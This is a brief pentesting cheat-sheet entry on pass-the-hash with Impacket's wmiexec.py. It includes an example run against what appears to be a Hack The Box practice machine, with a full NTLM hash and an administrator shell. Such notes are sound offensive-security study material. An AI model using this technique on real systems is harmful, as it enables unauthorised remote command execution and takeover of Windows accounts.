# WMI

## Pass The Hash

Use WMI to execute commands in a remote computer, if WMI is running:

```
wmiexec.py domain.name/username@machine.domain.name -hashes "LM:NTLM HASH HERE"
```

Putting the IP address instead of machine.domain.name should work as well.

Note that this can work even if you use the wrong domain name. Example:

```
┌──(x90slide㉿kali)-[~/exercises/htb/forest/exploit] 
└─$ wmiexec.py asd/Administrator@10.129.1.77 -hashes "aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6"
Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 
SecureAuth Corporation

[*] SMBv3.0 dialect used 
[!] Launching semi-interactive shell - Careful what you execute 
[!] Press help for extra shell commands 
C:>whoami 
htb\administrator
```

